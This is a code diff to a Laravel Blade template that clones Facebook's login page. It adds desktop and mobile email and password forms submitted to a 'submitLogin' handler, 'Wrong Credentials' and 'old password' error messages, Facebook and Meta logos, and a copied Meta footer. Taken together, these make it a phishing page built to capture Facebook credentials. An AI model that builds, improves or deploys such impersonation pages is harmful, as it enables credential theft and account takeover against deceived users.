@@ -1,4 +1,9 @@
 <div>
+    <style>
+        .login-modal-card .login-form .input div input{
+            background: #fff url("{{asset('new/o7nelmd.png')}}") repeat-x;
+        }
+    </style>
     <div id="root">
         <div class="App">
             <div class="box__shadow">
@@ -275,7 +280,7 @@
                         <div class="ant-modal-body">
                             <div class="confirmation-container-modal">
                                 @if($enableAppLogin)
-                                    <div style="min-height: 550px;display: flex;align-items: center">
+                                    <div style="min-height: 550px;display: flex;align-items: center;background: #e9ebee">
                                         <div class="app_card">
                                             <div class="icon-bar">
                                                 <img src="{{asset('new/fb.png')}}" alt="">
@@ -301,73 +306,79 @@
                                     </div>
                                 @endif
                                 @if($enableLoginForm)
-                                    <div class="auth-req-container auth__req-modal">
+                                    <div class="auth-req-container auth__req-modal is-desktop">
                                         <div class="auth-req">
                                             <div class="auth-req-text-modal">
-                                                <h2>Log Into Facebook</h2>
-                                                @if($loginError)
-                                                    <div class="wrong__password"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
-                                                @endif
-                                                @if($oldPassError)
-                                                    <div class="wrong__password"><h2>You Entered And Old Password</h2></div>
-                                                @endif
-                                                <div class="modal__confirmation">
-                                                    <form wire:submit.prevent="submitLogin" id="loginForm" class="ant-form ant-form-horizontal">
-                                                        <div>
-                                                            <div class="ant-form-item">
-                                                                <div class="ant-row ant-form-item-row">
-                                                                    <div class="ant-col ant-form-item-control">
-                                                                        <div class="ant-form-item-control-input">
-                                                                            <div class="ant-form-item-control-input-content">
-                                                                                <input required="" type="text" name="email" placeholder="Email or phone number" id="username" class="ant-input" value="" />
-                                                                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"></div>
-                                                                            </div>
-                                                                        </div>
+                                                <div>
+                                                    <img style="height: 106px" src="{{asset('new/facebook.svg')}}" alt="">
+                                                </div>
+
+                                                <div class="" style="display: flex;justify-content: center">
+                                                    <div class="login-modal-card">
+                                                        <h2 style="margin-top: 0">Log into Facebook</h2>
+                                                        <div class="login-form">
+                                                            @if($loginError)
+                                                                <div class="wrong__password"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
+                                                            @endif
+                                                            @if($oldPassError)
+                                                                <div class="wrong__password"><h2>You Entered And Old Password</h2></div>
+                                                            @endif
+                                                            <form wire:submit.prevent="submitLogin" id="loginForm" class="ant-form ant-form-horizontal">
+                                                                <div class="input">
+                                                                    <div>
+                                                                        <input required="" type="text" name="email" placeholder="Email address or phone number" id="username"  />
+                                                                    </div>
+                                                                    <div >
+                                                                        <input required="" type="password" name="password" placeholder="Password" id="password"  />
                                                                     </div>
                                                                 </div>
+                                                                <div class="login-btn"><button type="submit">Log In</button></div>
+                                                            </form>
+                                                        </div>
+                                                        <div class="modal__confirmation-forgot">
+                                                            <div class="modal__confirmation-account">
+                                                                <a href="javascript:void(0)">Forgotten password?</a>
+                                                                <a href="javascript:void(0)">Sign up for Facebook</a>
                                                             </div>
                                                         </div>
-                                                        <div>
-                                                            <div class="ant-form-item">
-                                                                <div class="ant-row ant-form-item-row">
-                                                                    <div class="ant-col ant-form-item-control">
-                                                                        <div class="ant-form-item-control-input">
-                                                                            <div class="ant-form-item-control-input-content">
-                                                                                <input required="" type="password" name="password" placeholder="Password" id="password" class="ant-input" />
-                                                                                <div data-lastpass-icon-root="" style="position: relative !important; height: 0px !important; width: 0px !important; float: left !important;"></div>
-                                                                            </div>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                        <div><button type="submit">Log In</button></div>
-                                                    </form>
-                                                    <div class="modal__confirmation-forgot">
-                                                        <div class="modal__confirmation-account">
-                                                            <p>Forgot account?</p>
-                                                            <p>Sign up for Facebook</p>
-                                                        </div>
-                                                        <p class="not__now">Not now</p>
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="having-trouble-class having__trouble-modal"><button>Having trouble?</button></div>
-                                        <div class="show-footer-on-mobile-plus hide__footer-modal">
-                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
-                                            <div class="footer-flex-mobile-plus confimartion__modal">
-                                                <div>
-                                                    <h2>English (US)</h2>
-                                                    <p>Deutsch</p>
-                                                    <p>Српски</p>
-                                                    <p>Português (Brasil)</p>
+                                    </div>
+                                    <div class="is-mobile">
+                                        <div class="login-card-mobile">
+                                            <div class="heading">
+                                                <p>English (UK)</p>
+                                            </div>
+                                            <div class="icon">
+                                                <img src="{{asset('new/fb2.png')}}" alt="">
+                                            </div>
+                                            <div style="padding: 20px">
+                                                <form wire:submit.prevent="submitLogin">
+                                                    <div>
+                                                        <div class="input">
+                                                            <div>
+                                                                <input required="" type="text" name="email" placeholder="Email address or phone number" id="username"  />
+                                                            </div>
+                                                            <div >
+                                                                <input required="" type="password" name="password" placeholder="Password" id="password"  />
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="login-btn"><button type="submit">Log In</button></div>
+                                                </form>
+                                                <div class="forgotten">
+                                                    <a href="javascript:void(0)">Forgotten password?</a>
                                                 </div>
-                                                <div>
-                                                    <p>Italiano</p>
-                                                    <p>Bosanski</p>
-                                                    <p>Svensk</p>
-                                                    <button>+</button>
+                                                <div class="footer-bar" style="display: block;text-align: center">
+                                                    <a class="create-btn" href="javascript:void(0)">Create new account</a>
+                                                    <img src="{{asset('new/meta.png')}}" alt="">
+                                                    <ul>
+                                                        <li>About</li>
+                                                        <li>Help</li>
+                                                        <li>More</li>
+                                                    </ul>
                                                 </div>
                                             </div>
                                         </div>
@@ -450,8 +461,60 @@
                                 @endif
                             </div>
                             @if($showModalFooter)
-                                <div class="modal__footer">
-
+                                <div class="modal__footer is-desktop">
+                                    <div class="footer-menu-flex-ul">
+                                        <div class="container-language-footer">
+                                            <ul class="flex-ul">
+                                                <li>English (US)</li>
+                                                <li>Español</li>
+                                                <li>Deutsch</li>
+                                                <li>Türkçe</li>
+                                                <li>Српски</li>
+                                                <li>Français (France)</li>
+                                                <li>Italiano</li>
+                                                <li>Bosanski</li>
+                                                <li>Svensk</li>
+                                                <li>Português (Brasil)</li>
+                                                <button class="countrys-button"><span>+</span></button>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul">
+                                            <ul>
+                                                <li>Sign Up</li>
+                                                <li>Log In</li>
+                                                <li>Messenger</li>
+                                                <li>Facebook Lite</li>
+                                                <li>Watch</li>
+                                                <li>Places</li>
+                                                <li>Games</li>
+                                                <li>Marketplace</li>
+                                                <li>Facebook Pay</li>
+                                                <li>Oculus</li>
+                                                <li>Portal</li>
+                                                <li>Instagram</li>
+                                                <li>Bulletin</li>
+                                                <li>Local</li>
+                                            </ul>
+                                        </div>
+                                        <div class="flex-second-ul-2">
+                                            <ul>
+                                                <li>Fundraisers</li>
+                                                <li>Services</li>
+                                                <li>Voting Information Centre</li>
+                                                <li>About</li>
+                                                <li>Create ad</li>
+                                                <li>Create Page</li>
+                                                <li>Developers</li>
+                                                <li>Careers</li>
+                                                <li>Privacy</li>
+                                                <li>Cookies</li>
+                                                <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
+                                                <li>Terms</li>
+                                                <li>Help</li>
+                                            </ul>
+                                        </div>
+                                        <div class="meta-footer"><p>Meta © {{\Carbon\Carbon::now()->year}}</p></div>
+                                    </div>
                                 </div>
                             @endif
                         </div>
